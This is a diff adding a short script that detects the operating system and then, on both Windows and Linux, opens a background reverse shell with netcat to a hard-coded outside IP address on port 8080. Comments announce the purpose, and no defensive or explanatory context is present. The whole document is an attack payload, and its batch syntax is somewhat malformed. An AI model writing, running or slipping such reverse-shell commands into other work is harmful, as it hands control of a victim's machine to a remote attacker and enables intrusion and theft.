@@ -1,0 +1,15 @@
+REM Detect the operating system
+OSNAME WINDOWS
+IF NOT %OSNAME% == WINDOWS GOTO LINUX
+
+REM Windows
+REM Open a reverse shell in the background
+CMD /C start cmd /c "nc -e cmd.exe 53.85.120.111 8080"
+GOTO END
+
+:LINUX
+REM Linux
+REM Open a reverse shell in the background
+bash -c "nc -e /bin/bash 53.85.120.111 8080 &"
+
+:END
